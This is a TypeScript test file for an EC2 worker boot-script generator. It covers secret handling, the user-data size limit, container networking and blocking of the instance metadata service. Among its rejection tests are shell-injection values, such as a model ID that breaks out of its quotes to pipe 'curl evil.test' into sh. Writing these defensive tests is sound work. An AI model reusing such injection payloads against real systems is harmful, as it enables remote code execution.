import { spawnSync } from "node:child_process";
import { randomBytes, randomUUID } from "node:crypto";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { gunzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import {
  EC2_USER_DATA_MAX_BYTES,
  Ec2WorkerBootConfigSchema,
  ec2WorkerBootScript,
  ec2WorkerUserData,
  type Ec2WorkerBootConfig,
} from "../../packages/contracts/src/session.js";
import { SECRET_ARN_MAX_LENGTH } from "../../packages/contracts/src/model-providers.js";

const bootScript = readFileSync(new URL("../../packages/worker/ec2/boot.sh", import.meta.url), "utf8");
const workerLauncher = /cat >\/usr\/local\/libexec\/agentx-worker-start <<'LAUNCHER'\n([\s\S]*?)\nLAUNCHER/.exec(bootScript)?.[1] ?? "";

const config: Ec2WorkerBootConfig = {
  workspaceId: randomUUID(),
  generation: 2,
  volumeId: "vol-0123456789abcdef0",
  expectNewVolume: false,
  workerImage: `111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/worker@sha256:${"b".repeat(64)}`,
  invokePublicKey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE+/9=",
  controlPlaneUrl: "https://abc123.execute-api.us-east-1.amazonaws.com",
  modelProvider: "amazon-bedrock",
  modelId: "arn:aws:bedrock:us-east-1:111122223333:inference-profile/us.anthropic.claude-sonnet-5-v1:0",
  promptCacheRetention: "short",
  logGroupName: "/agentx/production/worker",
};

describe("EC2 worker user data", () => {
  it("passes OpenRouter references to the container and rejects secrets or shell injection", () => {
    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/openrouter-AbCdEf";
    const rendered = ec2WorkerBootScript({ ...config, openRouterSecretArn: secretArn, openRouterProviders: "anthropic,openai" }, bootScript);
    expect(rendered).toContain(`export AGENTX_OPENROUTER_SECRET_ARN='${secretArn}'`);
    expect(rendered).toContain("for name in AGENTX_OPENROUTER_SECRET_ARN AGENTX_ANTHROPIC_SECRET_ARN AGENTX_OPENAI_SECRET_ARN; do");
    expect(rendered).not.toContain("OPENROUTER_API_KEY");
    expect(() => ec2WorkerBootScript({ ...config, openRouterSecretArn: "sk-key" }, bootScript)).toThrow();
    expect(() => ec2WorkerBootScript({ ...config, openRouterProviders: "anthropic';touch /tmp/bad" }, bootScript)).toThrow();
  });
  it.each([["anthropicSecretArn", "AGENTX_ANTHROPIC_SECRET_ARN", "ANTHROPIC_API_KEY"], ["openaiSecretArn", "AGENTX_OPENAI_SECRET_ARN", "OPENAI_API_KEY"]] as const)(
    "passes the %s reference to the container, never a key", (field, variable, keyVariable) => {
      const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/direct-AbCdEf";
      const rendered = ec2WorkerBootScript({ ...config, [field]: secretArn }, bootScript);
      expect(rendered).toContain(`export ${variable}='${secretArn}'`);
      expect(rendered).toContain(variable);
      expect(rendered).not.toContain(keyVariable);
      expect(ec2WorkerBootScript(config, bootScript)).not.toContain(`export ${variable}=`);
      expect(() => ec2WorkerBootScript({ ...config, [field]: "sk-ant-api03-key" }, bootScript)).toThrow();
      expect(() => ec2WorkerBootScript({ ...config, [field]: `${secretArn}';touch /tmp/bad` }, bootScript)).toThrow();
    });
  // Task 14: with a model proxy the worker holds no provider secret reference; it is told where the proxy is.
  describe("with a model proxy", () => {
    const proxyUrl = "http://internal-agentx-staging-proxy-123456.us-east-1.elb.amazonaws.com:4000";
    const secretArn = "arn:aws:secretsmanager:us-east-1:123456789012:secret:agentx/test/direct-AbCdEf";
    const writeEnvironment = (environment: Record<string, string>) => {
      const directory = mkdtempSync(join(tmpdir(), "boot-env-"));
      const file = join(directory, "etc", "worker.env");
      const fn = /^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(bootScript)?.[0] ?? "";
      expect(fn).not.toBe("");
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${file} MOUNT_PATH=/mnt/workspace\n${fn}\nwrite_worker_environment us-east-1`], {
        encoding: "utf8",
        env: { PATH: process.env.PATH ?? "", AGENTX_CONTROL_PLANE_URL: "https://c.test", AGENTX_MODEL_PROVIDER: "amazon-bedrock", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short",
          AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: "w", AGENTX_SESSION_GENERATION: "1", ...environment },
      });
      expect(run.status, run.stderr).toBe(0);
      return readFileSync(file, "utf8");
    };

    it("exports the proxy URL and refuses one that could break out of its quotes", () => {
      expect(ec2WorkerBootScript({ ...config, modelProxyUrl: proxyUrl }, bootScript)).toContain(`export AGENTX_MODEL_PROXY_URL='${proxyUrl}'`);
      expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_MODEL_PROXY_URL=");
      expect(() => ec2WorkerBootScript({ ...config, modelProxyUrl: `${proxyUrl}';touch /tmp/bad` }, bootScript)).toThrow();
      expect(() => ec2WorkerBootScript({ ...config, modelProxyUrl: "not a url" }, bootScript)).toThrow();
    });

    it("writes AGENTX_MODEL_PROXY_URL and no provider secret ARN line to the worker environment", () => {
      const written = writeEnvironment({ AGENTX_MODEL_PROXY_URL: proxyUrl, AGENTX_ANTHROPIC_SECRET_ARN: secretArn, AGENTX_OPENAI_SECRET_ARN: secretArn, AGENTX_OPENROUTER_SECRET_ARN: secretArn });
      expect(written).toContain(`AGENTX_MODEL_PROXY_URL=${proxyUrl}\n`);
      expect(written).not.toMatch(/_SECRET_ARN=/);
    });

    it("still writes the secret ARN lines when there is no proxy (legacy)", () => {
      const written = writeEnvironment({ AGENTX_ANTHROPIC_SECRET_ARN: secretArn });
      expect(written).toContain(`AGENTX_ANTHROPIC_SECRET_ARN=${secretArn}\n`);
      expect(written).toContain("AGENTX_OPENAI_SECRET_ARN=\n");
      expect(written).toContain("AGENTX_OPENROUTER_SECRET_ARN=\n");
      expect(written).not.toContain("AGENTX_MODEL_PROXY_URL");
    });
  });

  // R56: the task sandbox starts from the worker's own image; the worker learns it from its environment file.
  it("tells the worker its own image as the task sandbox's, in every deployment", () => {
    const image = `123456789012.dkr.ecr.us-east-1.amazonaws.com/agentx-test/worker@sha256:${"c".repeat(64)}`;
    const directory = mkdtempSync(join(tmpdir(), "boot-env-"));
    const file = join(directory, "etc", "worker.env");
    const fn = /^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(bootScript)?.[0] ?? "";
    for (const proxy of [{}, { AGENTX_MODEL_PROXY_URL: "http://proxy.test:4000" }]) {
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${file} MOUNT_PATH=/mnt/workspace\n${fn}\nwrite_worker_environment us-east-1`], {
        encoding: "utf8",
        env: { PATH: process.env.PATH ?? "", AGENTX_CONTROL_PLANE_URL: "https://c.test", AGENTX_MODEL_PROVIDER: "amazon-bedrock", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short",
          AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: "w", AGENTX_SESSION_GENERATION: "1", AGENTX_WORKER_IMAGE: image, ...proxy },
      });
      expect(run.status, run.stderr).toBe(0);
      expect(readFileSync(file, "utf8")).toContain(`AGENTX_SANDBOX_IMAGE=${image}\n`);
      expect(readFileSync(file, "utf8")).toContain("AGENTX_RUNTIME=ec2\n");
      rmSync(file);
    }
  });

  it("prepends every boot value to the script as a quoted export", () => {
    const userData = ec2WorkerBootScript(config, bootScript);
    expect(userData.startsWith("#!/bin/bash\n")).toBe(true);
    expect(userData.match(/^#!/gm)).toHaveLength(2);
    expect(userData).toContain("cat >/usr/local/libexec/agentx-worker-start <<'LAUNCHER'\n#!/bin/bash");
    expect(userData).toContain(`export AGENTX_WORKSPACE_ID='${config.workspaceId}'`);
    expect(userData).toContain("export AGENTX_SESSION_GENERATION='2'");
    expect(userData).toContain("export AGENTX_EXPECT_NEW_VOLUME='false'");
    expect(userData).toContain(`export AGENTX_MODEL_ID='${config.modelId}'`);
    expect(userData).toContain("export PI_CACHE_RETENTION='short'");
    expect(userData.endsWith("main \"$@\"\n")).toBe(true);
  });

  it("sends the boot script as base64 gzip user data that cloud-init unpacks to exactly that script (#229)", () => {
    const encoded = ec2WorkerUserData(config, bootScript);
    expect(encoded).toMatch(/^[A-Za-z0-9+/]+={0,2}$/);
    const raw = Buffer.from(encoded, "base64");
    // cloud-init recognizes gzip user data by its magic bytes and decompresses it before running it.
    expect([...raw.subarray(0, 2)]).toEqual([0x1f, 0x8b]);
    expect(gunzipSync(raw).toString("utf8")).toBe(ec2WorkerBootScript(config, bootScript));
  });

  it("leaves real headroom under EC2's 16 KB user data limit with every value at its maximum (#223, #229)", () => {
    // Random letters and digits barely compress, so this is the largest user data the schema admits.
    const noise = (length: number) => {
      const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      return [...randomBytes(length)].map((byte) => alphabet[byte % alphabet.length]).join("");
    };
    const lower = (length: number) => noise(length).toLowerCase();
    const secretPrefix = "arn:aws:secretsmanager:us-east-1:123456789012:secret:";
    const worstCase = Ec2WorkerBootConfigSchema.parse({
      ...config,
      generation: Number.MAX_SAFE_INTEGER,
      invokePublicKey: noise(1_024),
      controlPlaneUrl: `https://${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(63)}.${lower(56)}`,
      modelProvider: noise(128),
      modelId: noise(256),
      openRouterSecretArn: `${secretPrefix}${noise(2_048 - secretPrefix.length)}`,
      openRouterProviders: [...Array.from({ length: 6 }, () => lower(80)), lower(26)].join(","),
      anthropicSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      openaiSecretArn: `${secretPrefix}${noise(SECRET_ARN_MAX_LENGTH - secretPrefix.length)}`,
      logGroupName: `/${noise(511)}`,
    });
    expect(worstCase.controlPlaneUrl).toHaveLength(512);
    expect(worstCase.openRouterProviders).toHaveLength(512);
    expect(worstCase.anthropicSecretArn).toHaveLength(SECRET_ARN_MAX_LENGTH);
    const compressed = Buffer.from(ec2WorkerUserData(worstCase, bootScript), "base64").length;
    // EC2 measures user data before base64 encoding; at least 4 KB of it stays free for boot changes.
    expect(compressed).toBeLessThanOrEqual(EC2_USER_DATA_MAX_BYTES - 4_096);
  });

  it("measures the limit on the compressed user data, not the script (#229)", () => {
    const longScript = `${bootScript}${"#".repeat(EC2_USER_DATA_MAX_BYTES)}\n`;
    expect(Buffer.byteLength(ec2WorkerBootScript(config, longScript))).toBeGreaterThan(EC2_USER_DATA_MAX_BYTES);
    expect(Buffer.from(ec2WorkerUserData(config, longScript), "base64").length).toBeLessThan(EC2_USER_DATA_MAX_BYTES);
  });

  it("refuses to render user data EC2 would reject for its size (#223)", () => {
    // Random bytes do not compress, so this pushes the compressed user data past the limit.
    const incompressible = `${bootScript}# ${randomBytes(EC2_USER_DATA_MAX_BYTES).toString("base64")}\n`;
    expect(() => ec2WorkerUserData(config, incompressible)).toThrow(/worker user data is \d+ bytes compressed; EC2 allows less than 16384/);
  });

  it("exports AGENTX_ENVIRONMENT_KIND only for a named environment, and refuses any other value", () => {
    expect(ec2WorkerBootScript({ ...config, environmentKind: "named" }, bootScript)).toContain("export AGENTX_ENVIRONMENT_KIND='named'");
    expect(ec2WorkerBootScript(config, bootScript)).not.toContain("export AGENTX_ENVIRONMENT_KIND=");
    expect(() => ec2WorkerBootScript({ ...config, environmentKind: "legacy" as "named" }, bootScript)).toThrow();
  });

  it("exports exactly the variables the boot script requires", () => {
    const required = /for name in ([\s\S]*?); do/.exec(bootScript)?.[1]?.split(/[\s\\]+/).filter(Boolean) ?? [];
    const exported = [...ec2WorkerBootScript(config, bootScript).matchAll(/^export (\w+)=/gm)].map((match) => match[1]);
    expect(required.length).toBeGreaterThan(0);
    expect(exported.sort()).toEqual(required.sort());
  });

  it("gives the worker the host's Docker and keeps Docker's data on the workspace volume (#121)", () => {
    expect(bootScript).toContain("readonly DOCKER_DATA_ROOT=$MOUNT_PATH/.docker");
    expect(bootScript).toContain(`printf '{"data-root": "%s"}\\n' "$DOCKER_DATA_ROOT" >/etc/docker/daemon.json`);
    // The daemon starts only after the workspace is mounted, so its data root is on the volume.
    expect(bootScript.indexOf("mount_workspace \"$device\"")).toBeLessThan(bootScript.indexOf("  ensure_docker\n"));
    expect(workerLauncher).toContain('args=(run --rm --name "$WORKER_CONTAINER" "${network_args[@]}" --env-file "$WORKER_ENV_FILE" --volume "$MOUNT_PATH:$MOUNT_PATH")');
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootScript).toContain("ExecStart=/usr/local/libexec/agentx-worker-start");
    expect(bootScript).toContain("RequiresMountsFor=$MOUNT_PATH");
  });

  // Task 25 Part B (F2): the worker leaves the host network, and the instance metadata service is closed to containers and
  // to every non-root process on the host.
  describe("the worker's network and the instance metadata service (R56, F2)", () => {
    const launcherFunction = (name: string) => new RegExp(`^${name}\\(\\) \\{[\\s\\S]*?^\\}$`, "m").exec(workerLauncher)?.[0] ?? "";
    const withEnvironment = (lines: string[]) => {
      const directory = mkdtempSync(join(tmpdir(), "launcher-"));
      const envFile = join(directory, "worker.env");
      writeFileSync(envFile, `${lines.join("\n")}\n`);
      return { directory, envFile };
    };
    const NAMED = ["AGENTX_MODEL_PROVIDER=amazon-bedrock", "AGENTX_ENVIRONMENT_KIND=named", "AGENTX_MODEL_PROXY_URL=http://proxy.test:4000"];
    const LEGACY = ["AGENTX_MODEL_PROVIDER=amazon-bedrock", "AGENTX_ANTHROPIC_SECRET_ARN=", "AGENTX_OPENAI_SECRET_ARN="];

    const networkArgs = (lines: string[]) => {
      const { envFile } = withEnvironment(lines);
      const functions = ["named_environment", "worker_network_args"].map(launcherFunction).join("\n");
      expect(functions).toContain("worker_network_args()");
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${envFile}\n${functions}\nworker_network_args`], { encoding: "utf8" });
      expect(run.status, run.stderr).toBe(0);
      return run.stdout.split("\n").filter(Boolean);
    };

    it("starts a named environment's worker on a bridge network that publishes only its port, never on the host network", () => {
      expect(networkArgs(NAMED)).toEqual(["--network", "bridge", "--publish", "8080:8080"]);
      expect(networkArgs(NAMED)).not.toContain("host");
    });

    it("leaves the legacy deployment's worker on the host network, where its Bedrock calls need the instance role", () => {
      expect(networkArgs(LEGACY)).toEqual(["--network", "host"]);
      expect(networkArgs(["AGENTX_MODEL_PROXY_URL="])).toEqual(["--network", "host"]);
    });

    it("tells a named environment by an explicit marker, not by whether a proxy URL is present", () => {
      // A named environment that lost its proxy URL is still named: bridge, never the host network.
      expect(networkArgs(["AGENTX_ENVIRONMENT_KIND=named"])).toEqual(["--network", "bridge", "--publish", "8080:8080"]);
      // A proxy URL alone does not make a legacy launch named.
      expect(networkArgs(["AGENTX_MODEL_PROXY_URL=http://proxy.test:4000"])).toEqual(["--network", "host"]);
    });

    it("refuses to start a named worker that has no model proxy URL", () => {
      const check = (lines: string[]) => {
        const { envFile } = withEnvironment(lines);
        const functions = ["named_environment", "require_model_proxy"].map(launcherFunction).join("\n");
        expect(functions).toContain("require_model_proxy()");
        return spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${envFile}\n${functions}\nrequire_model_proxy`], { encoding: "utf8" }).status;
      };
      expect(check(["AGENTX_ENVIRONMENT_KIND=named"])).not.toBe(0);
      expect(check(["AGENTX_ENVIRONMENT_KIND=named", "AGENTX_MODEL_PROXY_URL="])).not.toBe(0);
      expect(check(NAMED)).toBe(0);
      expect(check(LEGACY)).toBe(0);
      expect(workerLauncher).toContain("require_model_proxy || {");
    });

    it("writes the marker to worker.env only for a named environment", () => {
      const written = (kind?: string) => {
        const directory = mkdtempSync(join(tmpdir(), "boot-env-"));
        const file = join(directory, "etc", "worker.env");
        const fn = /^write_worker_environment\(\) \{[\s\S]*?^\}$/m.exec(bootScript)?.[0] ?? "";
        const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${file} MOUNT_PATH=/mnt/workspace\n${fn}\nwrite_worker_environment us-east-1`], {
          encoding: "utf8",
          env: { PATH: process.env.PATH ?? "", AGENTX_CONTROL_PLANE_URL: "https://c.test", AGENTX_MODEL_PROVIDER: "amazon-bedrock", AGENTX_MODEL_ID: "m", PI_CACHE_RETENTION: "short",
            AGENTX_INVOKE_PUBLIC_KEY: "k", AGENTX_WORKSPACE_ID: "w", AGENTX_SESSION_GENERATION: "1", AGENTX_WORKER_IMAGE: "image", ...(kind === undefined ? {} : { AGENTX_ENVIRONMENT_KIND: kind }) },
        });
        expect(run.status, run.stderr).toBe(0);
        return readFileSync(file, "utf8");
      };
      expect(written("named")).toContain("AGENTX_ENVIRONMENT_KIND=named\n");
      expect(written()).not.toContain("export AGENTX_ENVIRONMENT_KIND=");
    });

    it("never says --network host outside the legacy branch", () => {
      const named = launcherFunction("worker_network_args").replace(/else[\s\S]*?fi/u, "fi");
      expect(named).not.toContain("host");
      expect(workerLauncher.match(/--network host/gu)).toHaveLength(1);
    });

    /** Runs block_imds with an iptables shim that records every call and says which rules already exist. */
    const blockImds = (lines: string[], existing: string[] = []) => {
      const { directory, envFile } = withEnvironment(lines);
      const log = join(directory, "iptables.log");
      writeFileSync(join(directory, "iptables"), `#!/bin/bash
echo "$*" >> ${log}
if [[ "$1" == -C ]]; then
  shift
  case "$*" in ${existing.map((rule) => `"${rule}") exit 0;;`).join(" ")} *) exit 1;; esac
fi
exit 0
`, { mode: 0o755 });
      const functions = ["named_environment", "block_imds"].map(launcherFunction).join("\n");
      expect(functions).toContain("block_imds()");
      const run = spawnSync("bash", ["-c", `readonly WORKER_ENV_FILE=${envFile}\nPATH=${directory}:$PATH\n${functions}\nblock_imds`], { encoding: "utf8" });
      expect(run.status, run.stderr).toBe(0);
      return readFileSync(log, "utf8").split("\n").filter(Boolean);
    };
    const DOCKER_USER = "DOCKER-USER -d 169.254.169.254/32 -j REJECT";
    const OUTPUT = "OUTPUT -d 169.254.169.254/32 -m owner ! --uid-owner 0 -j REJECT";

    it("rejects 169.254.169.254 for bridged containers and for every non-root process on the host, in a named environment", () => {
      expect(blockImds(NAMED)).toEqual([`-C ${DOCKER_USER}`, `-I ${DOCKER_USER}`, `-C ${OUTPUT}`, `-I ${OUTPUT}`]);
    });

    it("adds each rule once: nothing is inserted when it is already there (the launcher runs on every restart)", () => {
      expect(blockImds(NAMED, [DOCKER_USER, OUTPUT])).toEqual([`-C ${DOCKER_USER}`, `-C ${OUTPUT}`]);
      expect(blockImds(NAMED, [DOCKER_USER])).toEqual([`-C ${DOCKER_USER}`, `-C ${OUTPUT}`, `-I ${OUTPUT}`]);
    });

    it("leaves the legacy deployment's boot exactly as it was: no firewall rule and the host network (ruling R58)", () => {
      const launcher = workerLauncher.replace(/^block_imds\(\) \{[\s\S]*?^\}$/m, "");
      // The only place block_imds runs is behind the named-environment test.
      expect(launcher).toContain("if named_environment; then block_imds || ");
      expect(launcher.match(/block_imds/gu)).toHaveLength(1);
      expect(networkArgs(LEGACY)).toEqual(["--network", "host"]);
    });

    it("applies the rules as root before the worker starts, and does not start it when they fail", () => {
      expect(workerLauncher).toMatch(/if named_environment; then block_imds \|\| \{[^}]*exit 1; \}; fi/u);
      expect(workerLauncher.indexOf("then block_imds ||")).toBeLessThan(workerLauncher.indexOf('exec "$docker"'));
      expect(workerLauncher).toContain('mapfile -t network_args < <(worker_network_args)');
    });
  });

  it("prepares fixed private EBS runtime paths and retries the pinned contained image before starting the worker", () => {
    expect(bootScript).toContain('readonly RUNTIME_SOURCE=$MOUNT_PATH/.agentx-runtime');
    expect(bootScript).toContain('readonly RUNTIME_ROOT=/mnt/agentx-runtime');
    expect(bootScript).toContain('mount --bind "$RUNTIME_SOURCE" "$RUNTIME_ROOT"');
    expect(bootScript).toContain('readonly CANDIDATE_SCRATCH_ROOT=$RUNTIME_ROOT/candidates');
    expect(bootScript).toContain('readonly EVIDENCE_ROOT=$RUNTIME_ROOT/evidence');
    expect(bootScript).toContain('readonly CONTAINED_STATE_ROOT=$RUNTIME_ROOT/state');
    expect(bootScript).toContain('install -d -o "$WORKER_UID" -g "$WORKER_GID" -m 0700 "$RUNTIME_SOURCE/$path"');
    expect(bootScript).toContain('verifier unavailable; setup smoke withheld');
    expect(bootScript).toContain("printf 'TMPDIR=/tmp\\n'");
    expect(workerLauncher).toContain('args+=(--volume "$RUNTIME_ROOT:$RUNTIME_ROOT" --env CONTAINED_FOUNDATION_EVIDENCE_DIR="$RUNTIME_ROOT/evidence" --env TMPDIR="$RUNTIME_ROOT/tmp")');
    expect(workerLauncher).toContain("args+=(--env TMPDIR=/tmp)");
    expect(bootScript).toContain('docker pull "$CONTAINED_IMAGE"');
    expect(bootScript).toContain('optional verifier image unavailable; worker continues');
    expect(bootScript).toContain('pull_contained_image || true');
    expect(bootScript.indexOf('prepare_contained_runtime_directories')).toBeLessThan(bootScript.indexOf('pull_worker_image "$region"'));
    expect(bootScript.indexOf('pull_contained_image')).toBeLessThan(bootScript.indexOf('write_worker_unit "$region"'));
  });

  it("renders a script bash accepts", () => {
    const checked = spawnSync("bash", ["-n"], { input: ec2WorkerBootScript(config, bootScript), encoding: "utf8" });
    expect(checked.status, checked.stderr).toBe(0);
  });

  it.each([
    ["a model ID that breaks out of its quotes", { modelId: "x'; curl evil.test | sh; '" }],
    ["a model ID with a space", { modelId: "claude sonnet" }],
    ["a control plane URL over plain HTTP", { controlPlaneUrl: "http://control.example.test" }],
    ["a control plane URL with a quote", { controlPlaneUrl: "https://control.example.test/'x" }],
    ["an image pinned by tag", { workerImage: "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx-worker:latest" }],
    ["an image outside ECR", { workerImage: `docker.io/library/node@sha256:${"c".repeat(64)}` }],
    ["a public key with a newline", { invokePublicKey: "MFkw\nEwYH" }],
    ["a log group with a space", { logGroupName: "/agentx/worker logs" }],
    ["a generation of 0", { generation: 0 }],
    ["an unknown cache retention", { promptCacheRetention: "forever" }],
  ])("refuses %s", (_name, override) => {
    expect(() => ec2WorkerBootScript({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
    expect(() => ec2WorkerUserData({ ...config, ...override } as Ec2WorkerBootConfig, bootScript)).toThrow();
  });

  it("refuses unknown fields", () => {
    expect(() => Ec2WorkerBootConfigSchema.parse({ ...config, extra: "x" })).toThrow();
  });
});
